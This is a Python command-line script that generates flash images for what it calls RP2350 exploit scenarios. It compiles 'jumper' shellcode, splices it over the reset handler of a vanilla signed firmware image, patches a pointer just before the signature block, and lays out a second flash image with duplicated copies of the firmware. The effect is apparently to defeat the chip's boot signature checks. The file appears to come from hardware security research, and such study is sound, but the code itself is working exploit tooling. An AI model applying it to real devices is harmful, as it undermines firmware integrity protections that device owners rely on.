#!/usr/bin/env python3
"""Generate the flash images corresponding to several RP2350 Exploit scenarios."""
import struct
import subprocess
from pathlib import Path
from typing import Annotated

import typer

app = typer.Typer()


def generate_jumper_shellcode(
    filename: str = "rp2350_lfi/assets/jumper.s",
) -> bytes:
    """Generate the jumper shellcode."""
    cmd = f"arm-none-eabi-gcc -no-pie -nostdlib -mthumb -mcpu=cortex-m33 {filename} -o /tmp/jumper.o"
    subprocess.check_output(cmd, shell=True)

    outfile = "/tmp/jumper.bin"
    cmd = f"arm-none-eabi-objcopy -O binary /tmp/jumper.o {outfile}"
    subprocess.check_output(cmd, shell=True)

    with open(outfile, "rb") as f:
        return f.read()


@app.command()
def generate_binaries(
    vanilla_binary: Annotated[Path, typer.Option(help="Vanilla binary image")],
    flash_0: Annotated[Path, typer.Option(help="Output binary image for flash 0")],
    flash_1: Annotated[Path, typer.Option(help="Output binary image for flash 1")],
    signature_block_address: Annotated[
        int,
        typer.Option(
            help="Flash address (offset) of the signature block of the vanilla image"
        ),
    ],
) -> None:
    """Generate the flash images corresponding to several RP2350 Exploit Scenario."""
    shellcode = generate_jumper_shellcode()

    vanilla_binary_data = vanilla_binary.read_bytes()

    reset_hander_address = struct.unpack("<I", vanilla_binary_data[4:8])[0]
    reset_hander_address &= ~1

    # Make sure the shellcode is aligned on a
    # 32-bit boundary
    if reset_hander_address % 4 != 0:
        shellcode = b"\xC0\x46" + shellcode

    reset_hander_offset = reset_hander_address - 0x20000000

    flash_0_data = vanilla_binary_data[:reset_hander_offset]
    flash_0_data += shellcode
    flash_0_data += vanilla_binary_data[
        reset_hander_offset + len(shellcode) : signature_block_address - 4
    ]
    flash_0_data += struct.pack("<I", 0x1C000000 + 0x7000)
    flash_0_data += vanilla_binary_data[signature_block_address:]

    assert len(flash_0_data) == len(vanilla_binary_data)

    flash_0.write_bytes(flash_0_data)

    flash_1_data = vanilla_binary_data[:signature_block_address]
    flash_1_data += vanilla_binary_data

    flash_1_data = flash_1_data.ljust(0x7000, b"\xff")

    flash_1_data += vanilla_binary_data

    assert (
        len(flash_1_data) < 64 * 1024
    ), "Resulting binary is too large, move XIP image further"

    flash_1.write_bytes(flash_1_data)


if __name__ == "__main__":
    app()
